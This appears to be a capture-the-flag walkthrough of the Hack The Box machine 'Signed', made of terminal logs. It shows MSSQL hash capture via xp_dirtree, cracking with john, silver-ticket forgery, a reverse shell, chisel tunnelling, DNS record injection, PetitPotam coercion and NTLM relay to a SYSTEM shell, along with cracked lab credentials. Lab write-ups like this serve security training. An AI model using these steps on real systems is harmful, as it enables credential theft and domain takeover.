
### Initial access
Port scan
```

```
subdomain scan
dirscan
filescan

Using mssql and responder to catch svc hash and crack it
```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ impacket-mssqlclient 'scott:Sm230#C5NatH'@10.129.242.173   
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (scott  guest@master)> enable_xp_cmdshell 
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (scott  guest@master)> xp_dirtree \\10.10.17.47\shares\noexitst
subdirectory   depth   file   
------------   -----   ----  
```

```
[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:9afce4dd1c2601da:DB7401372BB56DCE90CAA27CD5323B50:0101000000000000802CBF46004BDD0135B9920957A63FC800000000020008004B0059004800500001001E00570049004E002D00360048004700580035004B0049004A0041003400450004003400570049004E002D00360048004700580035004B0049004A004100340045002E004B005900480050002E004C004F00430041004C00030014004B005900480050002E004C004F00430041004C00050014004B005900480050002E004C004F00430041004C0007000800802CBF46004BDD01060004000200000008003000300000000000000000000000003000008A127CEC5472095C8D4302916FA2527A7308D210B242D9DA9B9BC162A443BC090A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00340037000000000000000000  
```


```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:00 DONE (2026-09-23 02:10) 1.149g/s 5160Kp/s 5160Kc/s 5160KC/s purcitititya..punociudad
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ impacket-mssqlclient 'mssqlsvc:purPLE9795!@'@10.129.242.173 -windows-auth
/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: 'return' in a 'finally' block
  return string
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> 
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate                                                                                                                                                                                       
execute as   database   permission_name   state_desc   grantee    grantor                                                                                                                                                                   
----------   --------   ---------------   ----------   --------   ----------------------------                                                                                                                                              
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser 


SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   
SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
```


We have `Group IT` have sysadmin in database

After recon we see that we dont have any way to escalation more but we can create `Silver ticket` because we have service account and we can control the PAC to trick system thing the ticket we run belong to higher user.First get user sid
```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\mssqlsvc');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'   

┌──(kali㉿kali)-[~/HTB/Signed]
└─$ python3 -c '
import struct

# The binary Hex string retrieved from SQL Server
hex_sid = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
data = bytes.fromhex(hex_sid)

# Extract structural components
revision = data[0]
count = data[1]
authority = int.from_bytes(data[2:8], byteorder="big")

# Parse every 4 bytes using Little-Endian format (<I)
sub_auths = []
for i in range(8, len(data), 4):
    sub_auth = struct.unpack("<I", data[i:i+4])[0]
    sub_auths.append(sub_auth)

# Generate strings
full_sid = f"S-{revision}-{authority}-" + "-".join(map(str, sub_auths))
domain_sid = f"S-{revision}-{authority}-" + "-".join(map(str, sub_auths[:-1]))

print(f"\n[+] Full User SID : {full_sid}")
print(f"[+] Domain SID    : {domain_sid}\n")
'


[+] Full User SID : S-1-5-21-4088429403-1159899800-2753317549-1103
[+] Domain SID    : S-1-5-21-4088429403-1159899800-2753317549



```

Group id of IT
```
SQL (SIGNED\mssqlsvc  guest@master)>  select SUSER_SID('Signed\IT')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'  


python -c 'print(0x451)'
 1105
```

Create NTLM hash
```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).digest()).decode())'

ef699384c3285c54128a3ee1ddb1a0cc

```
We create ticket with user administrator and group is IT cuz normal administrator dont have sysadmin priv in  database
```
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
```
we have shell so let ger revshell
```
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\Administrator  dbo@master)> 

```

```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.242.173] 57138

PS C:\Windows\system32> whoami
signed\mssqlsvc

```

### Priv escalation
To use exploit first we need tunneling the machine using ligolo
```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo        
[sudo] password for kali: 

```
Using this to lpe https://github.com/mverschu/CVE-2025-33073.git
Using chisel to tunnelintg
```
──(kali㉿kali)-[~/HTB/Signed]
└─$ sudo chisel server -p 8000 --reverse

[sudo] password for kali: 
2026/09/23 05:24:37 server: Reverse tunnelling enabled
2026/09/23 05:24:37 server: Fingerprint 62xtNPWLvYJeJKrqEvJlwUvUEUTXI8zY6tRDBTT508I=
2026/09/23 05:24:37 server: Listening on http://0.0.0.0:8000
2026/09/23 05:24:39 server: session#1: Open (user=- addr=10.129.242.173:61154 remotes=R:0.0.0.0:445:127.0.0.1:445,R:127.0.0.1:1080:socks)
2026/09/23 05:24:39 server: session#1: tun: proxy#R:445=>445: Listening
2026/09/23 05:24:39 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.242.173] 61168

PS C:\Windows\system32> cd /temp
PS C:\temp> ls


    Directory: C:\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/23/2026  12:28 AM        7373824 agent.exe                                                             
-a----        9/23/2026   1:59 AM       11954176 chisel.exe                                                            


PS C:\temp> .\chisel.exe client 10.10.17.47:8000 R:socks



```
We testing the dns pollution https://github.com/dirkjanm/krbrelayx.git

```
┌──(kali㉿kali)-[~/HTB/Signed/krbrelayx]
└─$ proxychains -q python3 dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.17.47 10.129.242.173 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
                                            
```
Let relay attack
```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ proxychains -q impacket-ntlmrelayx -t winrms://10.129.242.173 -smb2support
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client WINRMS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```



```
┌──(kali㉿kali)-[~/HTB/Signed/krbrelayx]
└─$ proxychains -q nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petit                    
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         224.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False) 
SMB         224.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFile

```

```
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://10.129.242.173
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://10.129.242.173 SUCCEED [1]
[*] winrms:///@10.129.242.173 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Connection from 10.129.242.173 controlled, but there are no more targets left!

```


```
┌──(kali㉿kali)-[~/HTB/Signed]
└─$ rlwrap nc -v 127.0.0.1 11000
localhost [127.0.0.1] 11000 (?) open
Type help for list of commands

# ls

# whoami
nt authority\system

# whoami
nt authority\system

# echo 123
123

# pw

# pwd

# type C:/users/administrator/desktop/root.txt

# type C:\Users\Administrator\Desktop\root.txt

8673a155b10a6c40346142d70ef77cd5

```

| Username | pass         | Hash |
| -------- | ------------ | ---- |
| scott    | Sm230#C5NatH |      |
| mssqlsvc | purPLE9795!@ |      |
